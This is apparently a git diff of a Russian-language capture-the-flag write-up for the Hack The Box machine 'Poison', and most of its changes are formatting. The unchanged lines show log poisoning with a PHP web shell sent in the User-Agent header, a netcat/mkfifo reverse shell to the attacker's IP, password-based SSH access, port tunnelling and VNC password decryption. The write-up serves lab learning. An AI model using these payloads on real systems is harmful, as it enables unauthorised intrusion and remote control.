@@ -22,7 +22,7 @@ comments: true
 
 # nmap
 По традиции запустим Nmap в 2 этапа. Initial:
-```
+```text
 root@kali:~# nmap -n -vvv -sS -Pn --min-rate 5000 -oA nmap/initial 10.10.10.84
 Nmap scan report for 10.10.10.84
 Host is up, received user-set (0.073s latency).
@@ -37,8 +37,8 @@ Read data files from: /usr/bin/../share/nmap
 # Nmap done at Sat Sep 15 14:45:00 2018 -- 1 IP address (1 host up) scanned in 0.58 seconds
 ```
 
-Version (красивый отчет [здесь]({{ "/nmap/htb-poison-nmap-version.html" | relative_url }})):
-```
+Version ([красивый отчет]({{ "/nmap/htb-poison-nmap-version.html" | relative_url }})):
+```text
 root@kali:~# nmap -n -vvv -sS -Pn --min-rate 5000 -oA nmap/initial --stylesheet https://raw.githubusercontent.com/snovvcrash/snovvcrash.github.io/master/misc/nmap-bootstrap.xsl 10.10.10.84
 Nmap scan report for 10.10.10.84
 Host is up, received echo-reply ttl 63 (0.055s latency).
@@ -237,7 +237,7 @@ root@kali:~# curl -A "<?php system(\$_GET['cmd']); ?>" -X GET "http://10.10.10.8
 ### RCE → Reverse-Shell
 
 А здесь и до реверс-шелла недалеко. Перейдем по адресу `http://10.10.10.84/browse.php?file=/var/log/httpd-access.log&cmd=rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i |nc 10.10.14.116 31337 >/tmp/f` и получим желанный коннект на netcat:
-```
+```text
 nc -nlvvp 31337
 Ncat: Version 7.70 ( https://nmap.org/ncat )
 Ncat: Listening on :::31337
@@ -302,7 +302,7 @@ Ukd4RVdub3dPVU5uUFQwSwo=
 
 # SSH — Порт 22 (внутри машины)
 Time to SSH a bit:
-```
+```text
 root@kali:~# sshpass -p 'Charix!2#4%6&8(0' ssh -o StrictHostKeyChecking=no charix@10.10.10.84
 Last login: Sun Sep 16 15:24:58 2018 from 10.10.14.69
 FreeBSD 11.1-RELEASE (GENERIC) #0 r321309: Fri Jul 21 02:08:28 UTC 2017
@@ -355,13 +355,13 @@ drwx------  2 charix  charix   512 Sep 16 11:57 .ssh
 
 ## user.txt
 Заберем флаг пользователя:
-```
+```text
 charix@Poison:~ % cat /home/charix/user.txt
 eaacdfb2????????????????????????
 ```
 
 И уделим внимание файлу с интригующим названием `secret.zip`. Заберем на свою машину для изучения:
-```
+```text
 root@kali:~# sshpass -p 'Charix!2#4%6&8(0' scp -o StrictHostKeyChecking=no charix@10.10.10.84:secret.zip .
 
 root@kali:~# unzip secret.zip
@@ -381,7 +381,7 @@ root@kali:~# xxd secret
 ## PrivEsc: charix → root
 
 Вернемся на Poison и осмотримся. Среди множества мусора, полученного в результате вывода `ps aux`, видим одну необычную строчку:
-```
+```text
 charix@Poison:~ % ps auxww
 USER    PID  %CPU %MEM    VSZ   RSS TT  STAT STARTED     TIME COMMAND
 ...
@@ -390,7 +390,7 @@ root    545   0.0  0.9  23620  9032 v0- I    15:13    0:00.09 Xvnc :1 -desktop X
 ```
 
 Это же VNC-сервак! Посмотрим сеть для того, чтобы удостовериться:
-```
+```text
 charix@Poison:~ % netstat -anp tcp | grep -i listen
 tcp4       0      0 127.0.0.1.25           *.*                    LISTEN
 tcp4       0      0 *.80                   *.*                    LISTEN
@@ -420,7 +420,7 @@ tcp4       0      0 127.0.0.1.5901         *.*                    LISTEN
 
 ### SSH-Tunneling
 Пробросим порт до своей машины, используя [магию](https://pen-testing.sans.org/blog/2015/11/10/protected-using-the-ssh-konami-code-ssh-control-sequences "SANS Penetration Testing - Using the SSH 'Konami Code' (SSH Control Sequences) - SANS Institute") ssh-escape-последовательностей, чтобы не реинициализировать подключение:
-```
+```text
 charix@Poison:~ %
 charix@Poison:~ % ~C
 ssh> -L 5901:127.0.0.1:5901
@@ -442,9 +442,9 @@ root@kali:~# vncviewer -passwd secret 127.0.0.1:1
 И в принципе все, осталось только пара комментариев в [Разном]({{ page.url }}#разное).
 
 # Разное
-## Вскрытие VNC-секрета
-Посмотрим, что скрывалось в файле `secret`. Зачем? Потому что можем.
-```
+## Раскрытие секрета VNC
+Посмотрим, что скрывалось в файле `secret`. Зачем? Потому что можем:
+```text
 root@kali:~# git clone https://github.com/jeroennijhof/vncpwd && cd vncpwd
 
 root@kali:~# make
@@ -454,7 +454,7 @@ root@kali:~# ./vncpwd ../secret
 Password: VNCP@$$!
 ```
 
-Как раз 8 символов:exclamation:
+`VNCP@$$!` — как раз 8 символов:exclamation:
 
 ## /root/.vnc/passwd
 А в этой директории лежит, файл с паролем, о чудо, идентичный распакованному `/home/charix/secret.zip`.
